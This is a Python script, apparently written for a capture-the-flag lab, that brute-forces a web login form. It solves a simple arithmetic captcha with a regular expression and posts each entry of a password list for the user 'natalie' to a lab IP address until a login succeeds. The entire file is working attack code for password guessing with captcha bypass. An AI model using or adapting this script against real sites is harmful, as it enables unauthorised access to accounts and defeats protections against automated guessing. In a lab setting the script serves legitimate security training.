import requests
import sys
import re


def calculate(operator, operand1, operand2):
    if operator == "+":
        return operand1 + operand2
    elif operator == "-":
        return operand1 - operand2
    elif operator == "*":
        return operand1 * operand2
    elif operator == "/":
        return operand1 / operand2
    else:
        return None


def find_captcha(response_text):
    pattern_captcha = r"\d+\s*[+\-*/]+\s*\d+\s*=\s*\?"
    try:
        captcha = re.search(pattern_captcha, response_text).group()[:-4].split()
        result_captcha = str(calculate(captcha[1], int(captcha[0]), int(captcha[2])))
        return result_captcha
    except:
        print(f"Captcha not found.")
        return None


def find_password(response_text):
    pattern_password = r"Invalid password"
    try:
        re.search(pattern_password, response_text).group()[:-4].split()
        return False
    except:
        return True


def check_passwords(url, password):
    with requests.session() as s:
        r = s.post(url, data={"username": "admin", "password": "admin"})
        result_captcha = find_captcha(r.text)

        for password in passwords:
            payload = {
                "username": "natalie",
                "password": password,
                "captcha": result_captcha,
            }
            r = s.post(url, data=payload)
            result_captcha = find_captcha(r.text)
            if find_password(r.text):
                print(f"PASSWORD: {password}")
                sys.exit(1)
            else:
                print(f"PASSWORD {password} not found.")


if __name__ == "__main__":
    passwords = []
    with open("passwords.txt", "r") as f:
        for password in f.readlines():
            passwords.append(password.strip())

    url = "http://10.10.193.139/login" # change!
    check_passwords(url, passwords)
